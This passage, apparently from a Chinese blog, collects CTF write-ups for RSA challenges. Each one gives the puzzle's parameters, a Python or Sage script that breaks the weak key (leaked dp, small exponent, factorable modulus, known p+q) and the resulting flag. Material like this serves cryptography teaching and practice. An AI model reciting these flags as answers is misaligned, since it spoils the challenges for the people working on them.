130930373832526688558829060300851483713266963254235974298431376656411167133022811317545894728612430458019135516679725462401185182477034080725489312972647811206987019087112304263037750452464797665110487543936847345204903670608123393930724575428828772013286949081350478762423388787232374366710522714351275565934</span><br></pre></td></tr></table></figure>
<ol>
<li>根据pq的信息解方程即可，$2(p^2 + q^2) - (p-q)^2 = (p+q)^2$，emmm想用Python的cmath开根号或pow时会报溢出，所以整个解题过程在sage中实现。  </li>
<li>sage代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">x = <span class="number">270444057910653983291510342788952455699025527244143860021628706211845060535465451636917932321742662851778396880163283934354651585000332834898540722361841525611785115213254272403844678168824876648088734737984008962948002087685706718428981545607421310961607011733185197994774655764395053430025157272336829270370</span></span><br><span class="line">p_sub_q = -<span class="number">1561498872519047771182262215325701201358158620347512518506157053314655896940102610797598167661629486698972575964893349157597071878670209310740687905237512</span></span><br><span class="line">p_add_q = sqrt(<span class="number">2</span>*x-<span class="built_in">pow</span>(p_sub_q,<span class="number">2</span>))</span><br><span class="line">p = (p_add_q + p_sub_q)//<span class="number">2</span></span><br><span class="line">q = (p_add_q - p_sub_q)//<span class="number">2</span></span><br><span class="line">phn = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">10281503</span></span><br><span class="line">d = inverse_mod(e,phn)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">130930373832526688558829060300851483713266963254235974298431376656411167133022811317545894728612430458019135516679725462401185182477034080725489312972647811206987019087112304263037750452464797665110487543936847345204903670608123393930724575428828772013286949081350478762423388787232374366710522714351275565934</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;795faee7-4d4b-432c-9796-4758027c8a58&#125;</code></p>
<h2 id="RSAROLL"><a href="#RSAROLL" class="headerlink" title="RSAROLL"></a>RSAROLL</h2><ol>
<li>data.txt中的数据如下：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;920139713,19&#125;  </span><br><span class="line"></span><br><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">18414022</span><br><span class="line">368270835</span><br><span class="line">483295235</span><br><span class="line">263072905</span><br><span class="line">459788476</span><br><span class="line">483295235</span><br><span class="line">459788476</span><br><span class="line">663551792</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">428313374</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">425392137</span><br><span class="line">704796792</span><br><span class="line">458265677</span><br><span class="line">341524652</span><br><span class="line">483295235</span><br><span class="line">534149509</span><br><span class="line">425392137</span><br><span class="line">428313374</span><br><span class="line">425392137</span><br><span class="line">341524652</span><br><span class="line">458265677</span><br><span class="line">263072905</span><br><span class="line">483295235</span><br><span class="line">828509797</span><br><span class="line">341524652</span><br><span class="line">425392137</span><br><span class="line">475206804</span><br><span class="line">428313374</span><br><span class="line">483295235</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">306220148</span><br></pre></td></tr></table></figure>
<ol>
<li>把920139713拿到<a href="http://www.factordb.com/index.php">大数分解网站</a>分解，发现可以分解成18443和49891。所以{920139713,19}应该是{n,e}，剩下的行是密文。需要做的是循环求解每行的明文。  </li>
<li>逻辑比较简单。先由分解得到的p和q，以及已知的e求得d，然后读取data.txt中的内容，循环求解明文。代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">920139713</span></span><br><span class="line">e = <span class="number">19</span></span><br><span class="line">p = <span class="number">18443</span></span><br><span class="line">q = <span class="number">49891</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()[<span class="number">2</span>:]:</span><br><span class="line">    <span class="comment"># 从第三行开始读</span></span><br><span class="line">    c = <span class="built_in">int</span>(line)</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;13212je2ue28fy71w8u87y31r78eu1e2&#125;</code></p>
<h2 id="HDCTF2019-basic-rsa"><a href="#HDCTF2019-basic-rsa" class="headerlink" title="[HDCTF2019]basic rsa"></a>[HDCTF2019]basic rsa</h2><ol>
<li>题目attachment.py，具体代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*****************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br></pre></td></tr></table></figure>
<ol>
<li>所以基本逻辑很简单，先通过p，q，e求d，上文已经有求解方法和案例。然后利用c，d，n求<code>int(b2a_hex(flag),16)</code>再反求flag。解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">c = <span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = a2b_hex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>注意这里m从10进制转到16进制后，前面会有0x的前缀，所以取下标2及以后部分。<code>flag&#123;B4by_Rs4&#125;</code></p>
<h2 id="GUET-CTF2019-BabyRSA"><a href="#GUET-CTF2019-BabyRSA" class="headerlink" title="[GUET-CTF2019]BabyRSA"></a>[GUET-CTF2019]BabyRSA</h2><ol>
<li>题目给了一个BabyRsa文件，用winhex打开发现这是一个文本文件，直接用记事本打开即可。有以下信息：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p + q : 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span><br><span class="line">(p+1)(q+1) : 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span><br><span class="line">e : 0xe6b1bee47bd63f615c7d0a43c529d219</span><br><span class="line">d : 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span><br><span class="line">enc_flag : 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span><br></pre></td></tr></table></figure>
<ol>
<li>所以令x=p+q，y=(p+1)(q+1)，就有<code>n=p*q=y-x-1</code>，这里给的e其实用不到。直接m=pow(enc_flag,d,n)就得到明文数据了，解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="comment"># x = p+q</span></span><br><span class="line"><span class="comment"># y = (p+1)(q+1)</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">y = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span></span><br><span class="line">d = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">enc_flag = <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line"></span><br><span class="line">n = y - x - <span class="number">1</span></span><br><span class="line">m = <span class="built_in">pow</span>(enc_flag,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;cc7490e-78ab-11e9-b422-8ba97e5da1fd&#125;</code></p>
<h2 id="Buuoj-RSA2"><a href="#Buuoj-RSA2" class="headerlink" title="Buuoj RSA2"></a><a name="Buuoj_RSA2">Buuoj RSA2</a></h2><ol>
<li>题目信息：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line">c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br></pre></td></tr></table></figure>
<ol>
<li>这是由dp求解p的问题。求解方法已在上文中有具体推导过程，解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):</span><br><span class="line">    <span class="keyword">if</span> (e*dp - <span class="number">1</span>)%y == <span class="number">0</span>:</span><br><span class="line">        p = (e*dp - <span class="number">1</span>)//y + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125;</code></p>
<h2 id="Buuoj-Dangerous-RSA"><a href="#Buuoj-Dangerous-RSA" class="headerlink" title="Buuoj Dangerous RSA"></a><a name="Dangerous_RSA">Buuoj Dangerous RSA</a></h2><ol>
<li>题目提供的信息：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n:  0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span><br><span class="line">e:  0x3</span><br><span class="line">c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span><br><span class="line">so,how to get the message?  </span><br></pre></td></tr></table></figure>
<ol>
<li>小指数明文爆破，前文已有原理。具体解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+k*n,e)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(c+k*n,e)[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><code>flag&#123;25df8caf006ee5db94d48144c33b2c3b&#125;</code></p>
<h2 id="GWCTF-2019-BabyRSA"><a href="#GWCTF-2019-BabyRSA" class="headerlink" title="[GWCTF 2019]BabyRSA"></a>[GWCTF 2019]BabyRSA</h2><ol>
<li>解压缩文件，有encrypt.py和secret，其中secret是文本文件，内容如下：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N=636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span><br><span class="line">m1=90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span><br><span class="line">m2=487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span><br></pre></td></tr></table></figure>
<p>encrypt.py如下：  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;GWHT&#123;******&#125;&#x27;</span></span><br><span class="line">secret = <span class="string">&#x27;******&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) == <span class="number">38</span>)</span><br><span class="line"></span><br><span class="line">half = <span class="built_in">len</span>(flag) / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag1 = flag[:half]</span><br><span class="line">flag2 = flag[half:]</span><br><span class="line"></span><br><span class="line">secret_num = getPrime(<span class="number">1024</span>) * bytes_to_long(secret)</span><br><span class="line"></span><br><span class="line">p = sympy.nextprime(secret_num)</span><br><span class="line">q = sympy.nextprime(p)</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">F1 = bytes_to_long(flag1)</span><br><span class="line">F2 = bytes_to_long(flag2)</span><br><span class="line"></span><br><span class="line">c1 = F1 + F2</span><br><span class="line">c2 = <span class="built_in">pow</span>(F1, <span class="number">3</span>) + <span class="built_in">pow</span>(F2, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">assert</span>(c2 &lt; N)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">pow</span>(c1, e, N)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, e, N)</span><br><span class="line"></span><br><span class="line">output = <span class="built_in">open</span>(<span class="string">&#x27;secret&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;N=&#x27;</span> + <span class="built_in">str</span>(N) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;m1=&#x27;</span> + <span class="built_in">str</span>(m1) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.write(<span class="string">&#x27;m2=&#x27;</span> + <span class="built_in">str</span>(m2) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">output.close()</span><br></pre></td></tr></table></figure>
<ol>
<li>由以上代码可以得到以下表达式：<br>$c1=F1+F2$<br>$c2=F1^{3}+F2^{3}$<br>$c1=m1^{d}\ mod\ N$<br>$c2=m2^{d}\ mod\ N$<br>d可由e,p,q求得。而p,q可通过yafu对N进行分解得到。所以拿到d后就可以求出c1和c2，然后解方程即可得到F1和F2，最后拼出flag。  </li>
<li>解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">N = <span class="number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span></span><br><span class="line">p = <span class="number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737</span></span><br><span class="line">q = <span class="number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699</span></span><br><span class="line"></span><br><span class="line">m1 = <span class="number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span></span><br><span class="line">m2 = <span class="number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span></span><br><span class="line"></span><br><span class="line">phn = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e,phn)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1,d,N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,d,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"></span><br><span class="line">F1 = Int(<span class="string">&#x27;F1&#x27;</span>)</span><br><span class="line">F2 = Int(<span class="string">&#x27;F2&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(F1 + F2 == <span class="built_in">int</span>(c1))</span><br><span class="line">s.add(F1**<span class="number">3</span> + F2**<span class="number">3</span> == <span class="built_in">int</span>(c2))</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">1590956290598033029862556611630426044507841845</span>)+long_to_bytes(<span class="number">1141553212031156130619789508463772513350070909</span>))</span><br></pre></td></tr></table></figure>
<p><code>GWHT&#123;f709e0e2cfe7e530ca8972959a1033b2&#125;</code>  </p>
<h2 id="HDCTF2019-bbbbbbrsa"><a href="#HDCTF2019-bbbbbbrsa" class="headerlink" title="[HDCTF2019]bbbbbbrsa"></a>[HDCTF2019]bbbbbbrsa</h2><ol>
<li>题目给了enc和encode.py，内容如下：  </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 177077389675257695042507998165006460849</span><br><span class="line">n = 37421829509887796274897162249367329400988647145613325367337968063341372726061</span><br><span class="line">c = ==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b32encode</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd,iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;******************************&quot;</span></span><br><span class="line"></span><br><span class="line">nbit = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">p = getPrime(nbit)</span><br><span class="line">q = getPrime(nbit)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p</span><br><span class="line"><span class="built_in">print</span> n</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = random.randint(<span class="number">50000</span>,<span class="number">70000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">if</span> gcd(e,phi) == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		e -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(<span class="built_in">int</span>(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> b32encode(<span class="built_in">str</span>(c))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2373740699529364991763589324200093466206785561836101840381622237225512234632</span></span><br></pre></td></tr></table></figure>
<ol>
<li>所以思路是：先求c，这个c值不看代码，直接从enc文本中就可以看出是逆序的base64结果，所以先逆序过来再base64解密即可；其次，由e爆破得到d；最后因为有$c=int(b2a_hex(flag),16)^{e}\ mod\ n$，所以有$int(b2a_hex(flag),16)=c^{d}\ mod\ n$，可整理得到flag，代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">177077389675257695042507998165006460849</span></span><br><span class="line">n = <span class="number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span></span><br><span class="line">c = <span class="string">&quot;==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM&quot;</span></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">str</span>(c)[::-<span class="number">1</span>]</span><br><span class="line">c = base64.b64decode(c)</span><br><span class="line"><span class="comment"># c = 2373740699529364991763589324200093466206785561836101840381622237225512234632</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50000</span>,<span class="number">70000</span>):</span><br><span class="line">    <span class="keyword">if</span> gcd(e,phi) == <span 